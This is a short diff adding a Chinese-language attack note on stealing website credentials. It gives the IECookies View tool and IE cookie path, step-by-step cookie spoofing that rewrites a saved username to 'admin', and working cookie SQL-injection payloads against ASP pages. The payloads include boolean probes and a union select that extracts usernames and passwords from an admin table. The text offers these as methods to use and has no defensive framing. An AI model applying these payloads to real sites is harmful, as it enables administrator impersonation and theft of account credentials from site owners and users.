@@ -1,0 +1,15 @@
+
+IECookies View 的IECV.exe查看cookie敏感信息
+C:\Documents and Settings\Administrator\Local Settings\Temporary Internet Files
+工具 ---internet选项--常规---设置--查看文件
+
+cookie欺骗   清空cookie文件 注册一个帐号 登录  保存时间一个月  之后退出
+打开cookie临时文件--找到保存网站的cookie 有工具查看 修改用户名 本来注册的keio
+修改成管理员的admin 保存cookie后在登录进行cookie欺骗
+
+cookie注入
+asp?id=javascript:alert(document.cookie="id="+escape("137 and 1=1"));  正常
+asp?id=javascript:alert(document.cookie="id="+escape("137 and 1=2"));  不正常
+先浏览注入点  之后清空url  
+javascript:alert(document.cookie="id="+escape("137 union select 1,username,3,password,5,6,7 from admin")); ---确定
+之后返回  访问asp 页面 后门的参数不用 可以获得帐号密码 
